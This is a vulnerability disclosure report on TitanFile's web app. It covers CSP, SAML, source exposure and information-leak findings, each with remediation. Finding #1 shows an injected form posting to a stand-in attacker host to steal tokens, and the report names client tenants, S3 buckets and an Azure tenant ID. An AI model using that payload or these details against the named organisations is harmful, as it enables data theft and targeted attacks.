# TitanFile Bug Bounty Report — app.titanfile.com

**Target:** https://app.titanfile.com  
**Program:** [Open Bug Bounty](https://www.openbugbounty.org/bugbounty/Titanfile/) | [VDP](https://www.titanfile.com/terms-policies/vulnerability-disclosure-policy/)  
**Date:** 2026-06-10  
**Researcher:** rjfs8320@gmail.com

---

## Executive Summary

Passive reconnaissance of `app.titanfile.com` revealed multiple security vulnerabilities across CSP configuration, SAML SSO implementation, information disclosure, and source code exposure. The most impactful findings relate to a dangerously permissive Content Security Policy and exposed SAML Service Provider metadata across the wildcard DNS namespace.

---

## Finding #1 — CSP `form-action` Wildcard Allows Form Data Exfiltration

**Severity: HIGH (CVSS 7.4)**  
**Type:** CWE-1021 — Improper Restriction of Rendered UI Layers

### Description

The Content-Security-Policy on all authenticated pages includes:

```
form-action 'self' *
```

The wildcard `*` in `form-action` allows HTML forms on the page to submit data to **any external domain**. If an attacker achieves even limited HTML injection (e.g., via stored XSS, WYSIWYG editor abuse, or phishing), they can exfiltrate sensitive form data — including CSRF tokens, file metadata, and user input — to an attacker-controlled server.

### Reproduction

```bash
curl -sI https://app.titanfile.com/ 2>&1 | grep -o "form-action[^;]*"
# Output: form-action 'self' *
```

### Impact

An attacker who can inject a `<form action="https://evil.com/steal">` tag can silently exfiltrate:
- CSRF tokens (enabling CSRF attacks)
- User-submitted data (file names, message content)
- Authentication tokens embedded in hidden form fields

### Remediation

Change `form-action 'self' *` to `form-action 'self'` to restrict form submissions to same-origin only.

---

## Finding #2 — CSP `unsafe-inline` + `unsafe-eval` in script-src on Authenticated Pages

**Severity: HIGH (CVSS 7.1)**  
**Type:** CWE-79 — Cross-site Scripting (XSS) via CSP Bypass

### Description

The CSP on authenticated pages (after login redirect) includes:

```
script-src 'self' js.stripe.com *.google.com *.gstatic.com appsforoffice.microsoft.com 
ajax.aspnetcdn.com *.pendo.io *.zuora.com 'unsafe-inline' 'unsafe-eval'
```

Both `'unsafe-inline'` and `'unsafe-eval'` completely negate CSP's XSS protection. Any injection point that can insert inline scripts or use `eval()` will execute without CSP blocking.

**Notably, the login page uses proper nonce-based CSP**, proving the team knows how to implement it — but the authenticated pages where sensitive data lives have the weakened policy.

### Reproduction

```bash
# Login page (secure - uses nonces):
curl -sI https://app.titanfile.com/login/ | grep script-src
# Output: script-src 'self' ... 'nonce-...'

# Authenticated pages (insecure):
curl -sI https://app.titanfile.com/ | grep script-src
# Output: script-src 'self' ... 'unsafe-inline' 'unsafe-eval'
```

### Impact

If any XSS vector exists on authenticated pages (stored XSS in channel messages, file names, contact names, etc.), the attacker's payload will execute unrestricted — CSP provides zero protection.

### Remediation

Migrate authenticated pages to nonce-based CSP (matching the login page pattern). Remove `'unsafe-inline'` and `'unsafe-eval'`.

---

## Finding #3 — SAML SP Metadata Accessible on Any Subdomain (Wildcard DNS)

**Severity: HIGH (CVSS 7.5)**  
**Type:** CWE-200 — Information Exposure + CWE-345 — Insufficient Verification of Data Authenticity

### Description

TitanFile uses wildcard DNS (`*.titanfile.com`). The SAML Service Provider metadata endpoint at `/saml2/metadata/` is accessible on **any subdomain** — including completely fabricated ones. The metadata reveals:

1. **`AuthnRequestsSigned="false"`** — SAML AuthnRequests are NOT signed
2. **`validUntil=""`** — Metadata never expires
3. **ACS URL** dynamically generated for the requested subdomain
4. **Technical contact email:** `app-support@titanfile.com`

### Reproduction

```bash
# Any random subdomain works:
curl -s https://anyrandomname.titanfile.com/saml2/metadata/
```

Returns valid SAML SP metadata with:
```xml
<ns0:SPSSODescriptor AuthnRequestsSigned="false" WantAssertionsSigned="true">
  <ns0:AssertionConsumerService Location="https://anyrandomname.titanfile.com/saml2/acs/"/>
</ns0:SPSSODescriptor>
```

### Impact

- **Tenant Enumeration:** While wildcard DNS means any subdomain "works", legitimate tenants can be differentiated by checking for custom branding or different CSP policies (e.g., `gowlingwlgca.titanfile.com` has Gowling WLG branding and SAML IdP configuration)
- **Unsigned SAML Requests:** Since `AuthnRequestsSigned="false"`, SAML AuthnRequests can be tampered with in transit — an attacker could modify the `AssertionConsumerServiceURL` to redirect SAML responses
- **Never-expiring metadata** creates a persistent attack surface

### Confirmed Legitimate Tenants (from CSP headers + branding):

| Subdomain | Client |
|---|---|
| `gowlingwlgca.titanfile.com` | Gowling WLG (Canada) |
| `foley.titanfile.com` | Foley & Lardner |
| `nsuarb.titanfile.com` | NS Utility and Review Board |
| `rbcbank.titanfile.com` | RBC Bank |

### Remediation

1. Sign SAML AuthnRequests (`AuthnRequestsSigned="true"`)
2. Set a valid `validUntil` date on metadata
3. Return 404 for SAML metadata on subdomains without configured IdPs
4. Consider restricting wildcard DNS to only registered tenant subdomains

---

## Finding #4 — Full Client-Side JavaScript Source Code Exposed (Unbundled)

**Severity: MEDIUM-HIGH (CVSS 6.5)**  
**Type:** CWE-540 — Information Exposure Through Source Code

### Description

The entire JavaScript application source code is served as raw, unbundled, commented source files — not minified or webpack-bundled. This includes:

| File | Contents |
|---|---|
| `/static/js/app.js` | Main application, imports, framework setup |
| `/static/js/router.js` | All application routes |
| `/static/js/controller.js` | Route handlers, RBAC logic |
| `/static/js/admin/commands.js` | Admin WebSocket commands |
| `/static/js/socket.js` | Socket.IO implementation |
| `/static/js/utils.ts` | Utility functions, auth helpers, CSRF setup |
| `/static/js/users/models.js` | User model, permission flags |
| `/static/js/files/models.js` | File download/upload logic |
| `/static/js/channels/collections.ts` | Channel API endpoints |
| `/static/js/settings/route-config.js` | Admin settings structure |
| `/static/js/ms365/host-action-dialog.tsx` | MS365 WOPI token flow |
| + many more | contacts, notifications, reports, search, etc. |

### Key Information Disclosed

**Admin WebSocket Commands:**
```javascript
socket.on('admin:enabledebug', this.enableDebug);  // Enable debug mode remotely
socket.on('admin:softlockout', this.softLockout);
socket.on('admin:hardlockout', this.hardLockout);
socket.on('permissions:update_perm_cache', this.permissionsChanged);
```

**Admin Features:**
- User Impersonation (`/settings/user-impersonation/`)
- Role Management (`/settings/roles/`)
- Security Settings (`/settings/security-settings/`)
- Data Retention policies

**API Endpoints:**
- `channels`, `files`, `user`, `members`, `contacts`, `notifications`, `logs`, `paymentmethod`
- `/extend_session/`, `/credeon-client/refreshToken/`
- `/trialelevation/:id/`

**Developer Information:**
- Author: Tony Abou-Assaleh (`taa@titanfile.com`)
- Copyright dates from 2012
- Internal build version: `596`

### Impact

Attackers gain a complete blueprint of the application logic, API surface, permission model, admin capabilities, and integration points — dramatically reducing the effort needed to find and exploit vulnerabilities.

### Remediation

Bundle and minify JavaScript for production. Remove source `.js`/`.ts`/`.tsx` files from the static directory. Use build hashes instead of version numbers for cache busting.

---

## Finding #5 — Customer Names and S3 Bucket Names Leaked in CSP Headers

**Severity: MEDIUM (CVSS 5.3)**  
**Type:** CWE-200 — Information Exposure

### Description

The CSP header on every response leaks customer-specific AWS S3 bucket names:

```
https://foley-common-upload.s3.amazonaws.com
https://gowlingwlg-uploads.s3.amazonaws.com
https://nsuarb-uploads.s3.amazonaws.com
https://rbcbank-uploads.s3.amazonaws.com
https://app-common-uploads.s3.amazonaws.com
https://us-common-uploads.s3.amazonaws.com
https://eu-common-uploads.s3.amazonaws.com
```

Plus Azure blob storage: `https://*.blob.core.windows.net`

### Confirmed Bucket Regions

| Bucket | Region | Client |
|---|---|---|
| `app-common-uploads` | ca-central-1 | TitanFile (shared) |
| `gowlingwlg-uploads` | ca-central-1 | Gowling WLG |
| `us-common-uploads` | us-east-1 | TitanFile (US) |
| `foley-common-upload` | us-east-1 | Foley & Lardner |

### Impact

- **Client enumeration:** Reveals enterprise customers (law firms, banks, government)
- **Targeted attacks:** Bucket names can be used for S3 bucket policy probing
- **Competitive intelligence:** Customer list of a security product is sensitive

### Remediation

Use a proxy/CDN to serve S3 content rather than whitelisting bucket URLs in CSP. Consider using S3 VPC endpoints or CloudFront distributions.

---

## Finding #6 — QA Environment Referenced in Production CSP

**Severity: MEDIUM (CVSS 5.3)**  
**Type:** CWE-200 — Information Exposure

### Description

The production CSP includes `*.titanfile.qa` in `default-src` and `connect-src`:

```
default-src 'self' ... *.titanfile.qa data: 'unsafe-inline'
```

The QA environment (`app.titanfile.qa`) is **live and accessible**, returning a login page identical to production.

### Reproduction

```bash
curl -sI https://app.titanfile.qa | head -5
# HTTP/2 302 → /login/?next=/
```

### Impact

- QA environments often have weaker security controls, test accounts, or debug features
- Including QA domains in production CSP means XSS payloads on production can load resources from QA
- QA data breaches could provide credentials that work on production

### Remediation

Remove `*.titanfile.qa` from the production CSP. QA should not be referenced in production headers.

---

## Finding #7 — SAML IdP URL Uses HTTP + Azure AD Tenant ID Exposed

**Severity: MEDIUM (CVSS 5.4)**  
**Type:** CWE-319 — Cleartext Transmission of Sensitive Information

### Description

The Gowling WLG tenant login page reveals:

**CA SAML IdP (HTTP!):**
```
/saml2/login/?idp=http://adfs.ca.gowlingwlg.com/adfs/services/trust
```

**UK SAML IdP (Azure AD tenant ID exposed):**
```
/saml2/login/?idp=https://sts.windows.net/e47efd1d-32f2-4a84-93b3-5d6c888ee46e/
```

### Reproduction

```bash
curl -s https://gowlingwlgca.titanfile.com/login/ | grep saml2
```

### Impact

- **HTTP IdP URL:** SAML metadata and authentication traffic could be intercepted via MITM (the actual redirect uses HTTPS, but the configured URL is HTTP)
- **Azure AD Tenant ID `e47efd1d-32f2-4a84-93b3-5d6c888ee46e`:** Can be used to enumerate users via Azure AD APIs, spray passwords, or craft targeted phishing

### Remediation

1. Change ADFS IdP URL to HTTPS
2. Do not expose IdP URLs on public-facing login pages
3. Mask Azure AD tenant IDs from client-side code

---

## Finding #8 — GraphQL Endpoint Accessible (Authentication Required)

**Severity: LOW-MEDIUM (CVSS 4.3)**  
**Type:** CWE-200 — Information Exposure

### Description

A GraphQL endpoint exists at `/graphql/` and returns 403 (authentication required). Without auth, it returns a Django-style error page rather than a proper error.

```bash
curl -sI https://app.titanfile.com/graphql/
# HTTP/2 403
```

### Impact

GraphQL endpoints are common targets for introspection attacks, query complexity DoS, and authorization bypass. An authenticated user should test for:
- Introspection enabled
- Missing authorization on queries/mutations
- Batch query attacks

---

## Finding #9 — Sensitive Paths Return 403 Instead of 404

**Severity: LOW (CVSS 3.1)**  
**Type:** CWE-200 — Information Exposure

### Description

Several sensitive paths return HTTP 403 (Forbidden) instead of 404 (Not Found), confirming their existence:

| Path | Status | Implication |
|---|---|---|
| `/.env` | 403 | Environment file exists on server |
| `/metrics/` | 403 | Metrics endpoint (Prometheus?) exists |
| `/static/` | 403 | Static file directory exists |
| `/media/static/uploads/` | 403 | Upload directory exists |
| `/media/static/uploads/branding/` | 403 | Branding upload directory exists |

### Remediation

Return 404 for all paths that should not be publicly known. Block `.env` at the WAF/CDN level.

---

## Finding #10 — Outdated Client-Side Libraries

**Severity: LOW (CVSS 3.1)**  
**Type:** CWE-1104 — Use of Unmaintained Third Party Components

### Description

| Library | Version Found | Current Version | Age |
|---|---|---|---|
| jQuery UI | 1.9.1 | 1.14.x | ~14 years old |
| Font Awesome | 4.3.0 | 6.x | ~11 years old |
| Backbone.js/Marionette | Legacy | Deprecated | Framework EOL |

### Reproduction

```bash
curl -s https://app.titanfile.com/ | grep jquery-ui
# jquery-ui-1.9.1.custom.css
```

---

## Additional Observations

### Good Security Practices Found

- HSTS enabled with `includeSubdomains` and 1-year max-age
- X-Frame-Options: DENY
- X-Content-Type-Options: nosniff
- Referrer-Policy: strict-origin-when-cross-origin
- Session cookies: HttpOnly + Secure + SameSite=Lax
- CSRF token properly implemented (Django csrfmiddlewaretoken)
- Password reset does NOT enumerate users (same response for valid/invalid emails)
- Login `next` parameter sanitized (rejects external URLs)
- TLS 1.3 with strong cipher suite (TLS_AES_256_GCM_SHA384)

### Technology Stack

- **Backend:** Django (Python)
- **Frontend:** Backbone.js + Marionette.js
- **Real-time:** Socket.IO
- **Cloud:** AWS (ALB, S3, CloudFront) + Microsoft Azure
- **Auth:** Django auth + SAML 2.0 + Google OAuth2 + MS365
- **Payments:** Stripe + Zuora
- **Analytics:** Pendo + Google Tag Manager
- **Integrations:** MS365, DocuSign, NetDocs, Credeon (CSE)

### Attack Surface Map

```
app.titanfile.com
├── /login/                    (username/password + Google OAuth2)
├── /saml2/
│   ├── /login/                (SAML SSO)
│   ├── /acs/                  (Assertion Consumer Service)
│   ├── /ls/                   (Single Logout)
│   └── /metadata/             (SP Metadata - PUBLIC)
├── /graphql/                  (GraphQL API - 403 unauth)
├── /socket.io/                (Socket.IO real-time)
├── /channels/:id/             (6-char alphanumeric channel IDs)
│   ├── /files/*path
│   ├── /ms365/
│   ├── /history/
│   ├── /options/
│   └── /contacts/
├── /settings/
│   ├── /users/
│   ├── /security-settings/
│   ├── /user-impersonation/   (Admin feature)
│   ├── /roles/
│   ├── /manage-integration/
│   ├── /billing-and-payments/
│   └── /manage-branding/
├── /reports/
├── /admin/login/              (Django admin)
├── /password/reset/
├── /extend_session/
├── /credeon-client/refreshToken/
├── /trialelevation/:id/
└── /static/js/*.js            (Full source code)
```

---

## Recommendations Priority

| Priority | Finding | Fix Effort |
|---|---|---|
| P0 | Fix `form-action 'self' *` → `form-action 'self'` | 5 min |
| P0 | Remove `'unsafe-inline' 'unsafe-eval'` from script-src | Medium |
| P1 | Bundle/minify JavaScript, remove source files | Medium |
| P1 | Sign SAML requests, add `validUntil`, return 404 for unconfigured subdomains | Medium |
| P2 | Remove customer S3 bucket names from CSP (use CloudFront) | Medium |
| P2 | Remove `*.titanfile.qa` from production CSP | 5 min |
| P3 | Return 404 instead of 403 for sensitive paths | Low |
| P3 | Update client-side libraries | Low |
